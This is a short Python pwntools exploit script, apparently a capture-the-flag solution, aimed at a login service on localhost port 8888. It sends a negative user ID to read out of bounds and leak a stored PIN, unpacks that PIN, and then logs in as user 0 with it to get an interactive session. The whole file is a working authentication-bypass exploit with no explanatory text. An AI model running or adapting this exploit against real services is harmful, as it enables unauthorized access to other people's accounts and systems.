#!/usr/bin/env python

from pwn import *
context.arch='amd64'
r = remote('127.0.0.1', 8888)

r.recvuntil('User ID: ')
r.sendline('-4')
r.recvuntil('PIN: ')
r.sendline('123')

l = r.recvuntil('] ... ')
pin = u32(l[12:16])
print 'pin =', pin

r.recvuntil('User ID: ')
r.sendline('0')
r.recvuntil('PIN: ')
r.sendline(str(pin))

r.recvuntil('Ok!\n')
r.interactive()
